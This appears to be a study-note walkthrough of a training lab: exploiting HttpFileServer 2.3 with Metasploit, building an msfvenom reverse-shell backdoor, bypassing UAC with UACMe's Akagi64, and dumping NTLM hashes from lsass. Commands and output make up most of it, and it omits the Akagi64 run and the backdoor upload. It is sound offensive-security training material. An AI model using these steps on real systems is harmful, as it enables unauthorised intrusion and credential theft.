---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/System - Host Based Attacks/Windows Privilege Escalation/Windows Privilege Escalation]]"
---

# 🧪 UAC Bypass UACMe

## Overview

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)using the [UACME](https://github.com/hfiref0x/UACME) tool. 

**UACME:**

- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
- Developed by https://twitter.com/hFireF0X
- Written majorly in C, with some code in C++

**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.

**Instructions:**

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Solution

```bash
nmap -sV -p- -T5 10.2.19.202
Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-26 04:09 IST
Nmap scan report for 10.2.19.202
Host is up (0.0024s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
49174/tcp open  msrpc              Microsoft Windows RPC
49181/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.75 seconds
```

```bash
msfconsole -q
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.2.19.202
RHOSTS => 10.2.19.202
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.11.2:4444 
[*] Using URL: http://0.0.0.0:8080/V3Pmr7dBikWAS
[*] Local IP: http://10.10.11.2:8080/V3Pmr7dBikWAS
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /V3Pmr7dBikWAS
[*] Sending stage (175174 bytes) to 10.2.19.202
[*] Meterpreter session 1 opened (10.10.11.2:4444 -> 10.2.19.202:49225) at 2024-03-26 04:14:34 +0530
[!] Tried to delete %TEMP%\zqOqexbfnKtUh.vbs, unknown result
[*] Server stopped.

meterpreter >
```

Now:

1. Generate msfvenom payload
2. Setup msf listener
3. upload backdoor.exe
4. Upload akagi64.exe to victim

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.2 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.11.2
LHOST => 10.10.11.2
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.11.2:1234 

```

```bash
meterpreter > cd C:/Temp
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
meterpreter > dir
Listing: C:\Temp
================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  199168  fil   2024-03-26 04:40:38 +0530  Akagi64.exe

meterpreter > 
```

```bash
[*] Started reverse TCP handler on 10.10.11.2:1234 
[*] Sending stage (175174 bytes) to 10.2.19.202
[*] Meterpreter session 1 opened (10.10.11.2:1234 -> 10.2.19.202:49335) at 2024-03-26 04:42:30 +0530

meterpreter >
```

```bash
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 

```

```bash
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

```bash
meterpreter > hashdump
[-] 2007: Operation failed: The parameter is incorrect.
meterpreter > pgrep lsass
688
meterpreter > migrate 688
[*] Migrating from 2936 to 688...
[*] Migration completed successfully.
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 

```

Flag is `4d6583ed4cef81c2f2ac3c88fc5f3da6`
